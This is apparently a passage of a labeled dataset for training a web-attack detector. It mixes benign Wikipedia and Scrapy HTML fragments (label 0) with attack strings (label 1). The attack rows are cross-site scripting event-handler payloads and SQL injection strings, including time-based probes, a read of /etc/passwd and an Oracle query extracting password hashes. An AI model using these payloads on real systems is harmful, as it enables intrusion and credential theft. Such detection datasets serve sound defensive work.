Minsky"">Marvin Minsky </a> (MIT) and <a href=""/wiki/Arthur_Samuel"" title=""Arthur Samuel"">Arthur Samuel </a> (<a href=""/wiki/IBM"" title=""IBM"">IBM </a>) became the founders and leaders of AI research.<sup id=""cite_ref-Hegemony_of_the_Dartmouth_conference_attendees_33-0"" class=""reference""><a href=""#cite_note-Hegemony_of_the_Dartmouth_conference_attendees-33"">&#91;33&#93; </a> </sup> They and their students produced programs that the press described as ""astonishing"":<sup id=""cite_ref-FOOTNOTERussellNorvig200318_34-0"" class=""reference""><a href=""#cite_note-FOOTNOTERussellNorvig200318-34"">&#91;34&#93; </a> </sup> computers were learning <a href=""/wiki/Draughts"" title=""Draughts"">checkers </a> strategies (c. 1954)<sup id=""cite_ref-35"" class=""reference""><a href=""#cite_note-35"">&#91;35&#93; </a> </sup> (and by 1959 were reportedly playing better than the average human),<sup id=""cite_ref-36"" class=""reference""><a href=""#cite_note-36"">&#91;36&#93; </a> </sup> solving word problems in algebra, proving <a href=""/wiki/Theorem"" title=""Theorem"">logical theorems </a> (<a href=""/wiki/Logic_Theorist"" title=""Logic Theorist"">Logic Theorist </a>, first run c. 1956) and speaking English.<sup id=""cite_ref-Golden_years_of_AI_37-0"" class=""reference""><a href=""#cite_note-Golden_years_of_AI-37"">&#91;37&#93; </a> </sup> By the middle of the 1960s, research in the U.S. was heavily funded by the <a href=""/wiki/DARPA"" title=""DARPA"">Department of Defense </a><sup id=""cite_ref-AI_funding_in_the_60s_38-0"" class=""reference""><a href=""#cite_note-AI_funding_in_the_60s-38"">&#91;38&#93; </a> </sup> and laboratories had been established around the world.<sup id=""cite_ref-AI_in_England_39-0"" class=""reference""><a href=""#cite_note-AI_in_England-39"">&#91;39&#93; </a> </sup> AI's founders were optimistic about the future: <a href=""/wiki/Herbert_A._Simon"" title=""Herbert A. Simon"">Herbert Simon </a> predicted, ""machines will be capable, within twenty years, of doing any work a man can do"". <a href=""/wiki/Marvin_Minsky"" title=""Marvin Minsky"">Marvin Minsky </a> agreed, writing, ""within a generation&#160;... the problem of creating 'artificial intelligence' will substantially be solved"".<sup id=""cite_ref-Optimism_of_early_AI_9-1"" class=""reference""><a href=""#cite_note-Optimism_of_early_AI-9""> </a> </sup>",0
+"<code draggable=""true"" ondragleave=""alert(1)"">test</code>",1
+select * from users where id = 1 +  ( $+ )  or 1 = 1 -- 1,1
+"select * from users where id = 1 <1## union select 1,version (  )  -- 1",1
+"<button oncopy=""alert(1)"" contenteditable>test</button>",1
+<dl>,0
+"<li><a href=""/wiki/Android_(robot)"" title=""Android (robot)"">Android </a> </li>",0
+"<ul><li><a href=""#CITEREFLugerStubblefield2004"">Luger &amp; Stubblefield 2004 </a>, pp.&#160;474–505 </li> </ul>",0
+"select * from users where id = '1' or  ( 1 )  = 1 union select 1,banner from v$version where rownum = 1 -- 1'",1
+"<q oncontextmenu=""alert(1)"">test</q>",1
+',1
+"<hr oncontextmenu=""alert(1)"">test</hr>",1
+admin' or ',1
+"<div draggable=""true"" contenteditable>drag me</div><bgsound ondrop=alert(1) contenteditable>drop here</bgsound>",1
+"<li><a href=""#CITEREFCrevier1993"">Crevier 1993 </a>, pp.&#160;239–243 </li>",0
+"select * from users where id = '1' %!<@ union select 1,version (  )  -- 1'",1
+select * from users where id = 1 %$ . or 1 = 1 -- 1,1
+POST /login,0
+"<image onkeydown=""alert(1)"" contenteditable>test</image>",1
+""" )  or pg_sleep ( __TIME__ ) --",1
+GET /blog?id=13,0
+"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/stats.html"">Stats Collection</a></li>",0
+GET /products/view?id=19,0
+"<style>:target {color: red;}</style><legend id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></legend>",1
+"1 or benchmark ( 10000000,MD5 ( 1  )  )  #",1
+' or 1 = 1,1
+"select * from users where id = 1 or "" ) ]"" or 1 = 1 -- 1",1
+"' union select 1,load_file ( '/etc/passwd' ) ,1,1,1;",1
+"<p>Robot designer <a href=""/wiki/Hans_Moravec"" title=""Hans Moravec"">Hans Moravec </a>, cyberneticist <a href=""/wiki/Kevin_Warwick"" title=""Kevin Warwick"">Kevin Warwick </a> and inventor <a href=""/wiki/Ray_Kurzweil"" title=""Ray Kurzweil"">Ray Kurzweil </a> have predicted that humans and machines will merge in the future into <a href=""/wiki/Cyborg"" title=""Cyborg"">cyborgs </a> that are more capable and powerful than either.<sup id=""cite_ref-Transhumanism_411-0"" class=""reference""><a href=""#cite_note-Transhumanism-411"">&#91;399&#93; </a> </sup> This idea, called <a href=""/wiki/Transhumanism"" title=""Transhumanism"">transhumanism </a>, has roots in <a href=""/wiki/Aldous_Huxley"" title=""Aldous Huxley"">Aldous Huxley </a> and <a href=""/wiki/Robert_Ettinger"" title=""Robert Ettinger"">Robert Ettinger </a>.",0
+"<a href=""/wiki/Explanation_based_learning"" class=""mw-redirect"" title=""Explanation based learning"">Explanation based learning </a>, relevance based learning, <a href=""/wiki/Inductive_logic_programming"" title=""Inductive logic programming"">inductive logic programming </a>, <a href=""/wiki/Case_based_reasoning"" class=""mw-redirect"" title=""Case based reasoning"">case based reasoning </a>:",0
+order by,1
+POST /products/delete?id=20,1
+"<sub onbeforecut=""alert(1)"" contenteditable>test</sub>",1
+"<li>Can a machine have a <a href=""/wiki/Mind"" title=""Mind"">mind </a>, <a href=""/wiki/Consciousness"" title=""Consciousness"">consciousness </a> and <a href=""/wiki/Philosophy_of_mind"" title=""Philosophy of mind"">mental states </a> in exactly the same sense that human beings do? Can a machine be <a href=""/wiki/Sentience"" title=""Sentience"">sentient </a>, and thus deserve certain rights? Can a machine <a href=""/wiki/Intention"" title=""Intention"">intentionally </a> cause harm? </li> </ol>",0
+GET /support,0
+"<li><a href=""/wiki/Eliminative_materialism"" title=""Eliminative materialism"">Eliminative materialism </a> </li>",0
+"select * from users where id = 1 union select .1$_,version (  )  -- 1",1
+"select * from users where id = 1 or "",."" or 1 = 1 -- 1",1
+"<div id=""mw-indicator-pp-autoreview"" class=""mw-indicator"">",0
+"<li><cite id=""CITEREFPooleMackworthGoebel1998"" class=""citation book""><a href=""/w/index.php?title=David_Poole_(researcher)&amp;action=edit&amp;redlink=1"" class=""new"" title=""David Poole (researcher) (page does not exist)"">Poole, David </a>; <a href=""/wiki/Alan_Mackworth"" title=""Alan Mackworth"">Mackworth, Alan </a>; <a href=""/w/index.php?title=Randy_Goebel&amp;action=edit&amp;redlink=1"" class=""new"" title=""Randy Goebel (page does not exist)"">Goebel, Randy </a> (1998). <a rel=""nofollow"" class=""external text"" href=""https://archive.org/details/computationalint00pool""><i>Computational Intelligence: A Logical Approach </i> </a>. New York: Oxford University Press. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-0-19-510270-3"" title=""Special:BookSources/978-0-19-510270-3""><bdi>978-0-19-510270-3 </bdi> </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Computational+Intelligence%3A+A+Logical+Approach&amp;rft.place=New+York&amp;rft.pub=Oxford+University+Press&amp;rft.date=1998&amp;rft.isbn=978-0-19-510270-3&amp;rft.aulast=Poole&amp;rft.aufirst=David&amp;rft.au=Mackworth%2C+Alan&amp;rft.au=Goebel%2C+Randy&amp;rft_id=https%3A%2F%2Farchive.org%2Fdetails%2Fcomputationalint00pool&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988"">",0
+<dt onfocusout=alert(1) tabindex=1 id=x></dt><input autofocus>,1
+"select * from users where id = 1 or ""1,"" or 1 = 1 -- 1",1
+"<ul draggable=""true"" ondragstart=""alert(1)"">test</ul>",1
+' or ''^',1
+"<track onmouseenter=""alert(1)"">test</track>",1
+@var select @var as var into temp end --,1
+"<p><a href=""/wiki/Knowledge_representation"" class=""mw-redirect"" title=""Knowledge representation"">Knowledge representation </a><sup id=""cite_ref-Knowledge_representation_91-0"" class=""reference""><a href=""#cite_note-Knowledge_representation-91"">&#91;88&#93; </a> </sup> and <a href=""/wiki/Knowledge_engineering"" title=""Knowledge engineering"">knowledge engineering </a><sup id=""cite_ref-Knowledge_engineering_92-0"" class=""reference""><a href=""#cite_note-Knowledge_engineering-92"">&#91;89&#93; </a> </sup> are central to classical AI research. Some ""expert systems"" attempt to gather together explicit knowledge possessed by experts in some narrow domain. In addition, some projects attempt to gather the ""commonsense knowledge"" known to the average person into a database containing extensive knowledge about the world. Among the things a comprehensive commonsense knowledge base would contain are: objects, properties, categories and relations between objects;<sup id=""cite_ref-Representing_categories_and_relations_93-0"" class=""reference""><a href=""#cite_note-Representing_categories_and_relations-93"">&#91;90&#93; </a> </sup> situations, events, states and time;<sup id=""cite_ref-Representing_time_94-0"" class=""reference""><a href=""#cite_note-Representing_time-94"">&#91;91&#93; </a> </sup> causes and effects;<sup id=""cite_ref-Representing_causation_95-0"" class=""reference""><a href=""#cite_note-Representing_causation-95"">&#91;92&#93; </a> </sup> knowledge about knowledge (what we know about what other people know);<sup id=""cite_ref-Representing_knowledge_about_knowledge_96-0"" class=""reference""><a href=""#cite_note-Representing_knowledge_about_knowledge-96"">&#91;93&#93; </a> </sup> and many other, less well researched domains. A representation of ""what exists"" is an <a href=""/wiki/Ontology_(computer_science)"" class=""mw-redirect"" title=""Ontology (computer science)"">ontology </a>: the set of objects, relations, concepts, and properties formally described so that software agents can interpret them. The <a href=""/wiki/Semantics"" title=""Semantics"">semantics </a> of these are captured as <a href=""/wiki/Description_logic"" title=""Description logic"">description logic </a> concepts, roles, and individuals, and typically implemented as classes, properties, and individuals in the <a href=""/wiki/Web_Ontology_Language"" title=""Web Ontology Language"">Web Ontology Language </a>.<sup id=""cite_ref-97"" class=""reference""><a href=""#cite_note-97"">&#91;94&#93; </a> </sup> The most general ontologies are called <a href=""/wiki/Upper_ontology"" title=""Upper ontology"">upper ontologies </a>, which attempt to provide a foundation for all other knowledge<sup id=""cite_ref-Ontology_98-0"" class=""reference""><a href=""#cite_note-Ontology-98"">&#91;95&#93; </a> </sup> by acting as mediators between <a href=""/wiki/Domain_ontology"" class=""mw-redirect"" title=""Domain ontology"">domain ontologies </a> that cover specific knowledge about a particular knowledge domain (field of interest or area of concern). Such formal knowledge representations can be used in content-based indexing and retrieval,<sup id=""cite_ref-99"" class=""reference""><a href=""#cite_note-99"">&#91;96&#93; </a> </sup> scene interpretation,<sup id=""cite_ref-100"" class=""reference""><a href=""#cite_note-100"">&#91;97&#93; </a> </sup> clinical decision support,<sup id=""cite_ref-101"" class=""reference""><a href=""#cite_note-101"">&#91;98&#93; </a> </sup> knowledge discovery (mining ""interesting"" and actionable inferences from large databases),<sup id=""cite_ref-102"" class=""reference""><a href=""#cite_note-102"">&#91;99&#93; </a> </sup> and other areas.<sup id=""cite_ref-103"" class=""reference""><a href=""#cite_note-103"">&#91;100&#93; </a> </sup>",0
+sqlvuln;,1
+' or 1 = 1--,1
+"<nextid onpaste=""alert(1)"" contenteditable>test</nextid>",1
+</span> </li>,0
+"<progress draggable=""true"" ondragstart=""alert(1)"">test</progress>",1
+"<th draggable=""true"" ondragstart=""alert(1)"">test</th>",1
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 1  )  )   AND 'i' = 'i",1
+"<menuitem onpaste=""alert(1)"" contenteditable>test</menuitem>",1
+UNION SELECT,1
+GET /products/view?id=34,0
+"select * from users where id = '1' or \.<$ union select 1,@@VERSION -- 1'",1
+"select * from users where id = 1 union select 1 $,version (  )  -- 1",1
+"<style>:target {color: red;}</style><applet id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></applet>",1
+"<li><a href=""#CITEREFNRC1999"">NRC 1999 </a>, pp.&#160;200–201 </li> </ul>",0
+GET /products?id=7,0
+"<ol><li>Is <a href=""/wiki/Artificial_general_intelligence"" title=""Artificial general intelligence"">artificial general intelligence </a> possible? Can a machine solve any problem that a human being can solve using intelligence? Or are there hard limits to what a machine can accomplish? </li>",0
+anything' or 'x' = 'x,1
+</span></a></dt><dd>Learn how to use contracts for testing your spiders.</dd>,0
+"<li><a href=""/wiki/Gordon_S._Brown"" title=""Gordon S. Brown"">Gordon S. Brown </a> </li>",0
+</span> 2019,0
+handler,1
+"<style>@keyframes x{}</style><img style=""animation-name:x"" onanimationstart=""alert(1)""></img>",1
+x' AND email IS NULL; --,1
+"select * from users where id = '1' + $+*$ union select 1,@@VERSION -- 1'",1
+GET /manage/users,1
+<map id=x tabindex=1 onactivate=alert(1)></map>,1
+"<li><a href=""/wiki/Distributed_artificial_intelligence"" title=""Distributed artificial intelligence"">Distributed artificial intelligence </a> </li> </ul>",0
+1 or 1 = 1,1
+"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/developer-tools.html"">Using your browser’s Developer Tools for scraping</a></li>",0
+"select * from users where id = 1 union select  ( 1 ) ,banner from v$version where rownum = 1 -- 1",1
+"<li><a href=""/wiki/Unmanned_vehicle"" title=""Unmanned vehicle"">Unmanned vehicle </a>",0
+1  )  )   or pg_sleep ( __TIME__ ) --,1
+"<li><a href=""/wiki/Legged_robot"" title=""Legged robot"">Walking </a>",0
+distinct,1
+"<li><a href=""/wiki/Mind%E2%80%93body_problem"" title=""Mind–body problem"">Mind–body problem </a>",0
+"</span> <span class=""reference-text""><a rel=""nofollow"" class=""external text"" href=""https://ishti.org/2018/11/19/using-artificial-intelligence-to-predict-flight-delays/"">Using AI to predict flight delays </a>, Ishti.org.",0
+"select * from users where id = 1 or ""1_"" or 1 = 1 -- 1",1
+"<dd>""A physical symbol system has the necessary and sufficient means of general intelligent action."" Newell and Simon argue that intelligence consists of formal operations on symbols.<sup id=""cite_ref-Physical_symbol_system_hypothesis_353-0"" class=""reference""><a href=""#cite_note-Physical_symbol_system_hypothesis-353"">&#91;342&#93; </a> </sup> <a href=""/wiki/Hubert_Dreyfus"" title=""Hubert Dreyfus"">Hubert Dreyfus </a> argued that, on the contrary, human expertise depends on unconscious instinct rather than conscious symbol manipulation and on having a ""feel"" for the situation rather than explicit symbolic knowledge. (See <a href=""/wiki/Dreyfus%27_critique_of_AI"" class=""mw-redirect"" title=""Dreyfus&#39; critique of AI"">Dreyfus' critique of AI </a>.)<sup id=""cite_ref-354"" class=""reference""><a href=""#cite_note-354"">&#91;343&#93; </a> </sup><sup id=""cite_ref-Dreyfus&#39;_critique_355-0"" class=""reference""><a href=""#cite_note-Dreyfus&#39;_critique-355"">&#91;344&#93; </a> </sup> </dd> </dl>",0
+"select * from users where id = 1 or ""{%"" or 1 = 1 -- 1",1
+GET /products/view?id=15,0
+<data onpointerover=alert(1)>XSS</data>,1
+GET /products?id=44,0
+"READTHEDOCS_DATA['source_suffix'] = "".rst""",0
+"<ul><li id=""n-help""><a href=""/wiki/Help:Contents"" title=""Guidance on how to use and edit Wikipedia"">Help </a> </li><li id=""n-aboutsite""><a href=""/wiki/Wikipedia:About"" title=""Find out about Wikipedia"">About Wikipedia </a> </li><li id=""n-portal""><a href=""/wiki/Wikipedia:Community_portal"" title=""About the project, what you can do, where to find things"">Community portal </a> </li><li id=""n-recentchanges""><a href=""/wiki/Special:RecentChanges"" title=""A list of recent changes in the wiki [r]"" accesskey=""r"">Recent changes </a> </li><li id=""n-contactpage""><a href=""//en.wikipedia.org/wiki/Wikipedia:Contact_us"" title=""How to contact Wikipedia"">Contact page </a> </li> </ul>",0
+"<style>@keyframes x{}</style><section style=""animation-name:x"" onanimationstart=""alert(1)""></section>",1
+"admin"" or ""1"" = ""1""--",1
+"<li>Ask or search questions in the <a class=""reference external"" href=""https://www.reddit.com/r/scrapy/"">Scrapy subreddit</a>.</li>",0
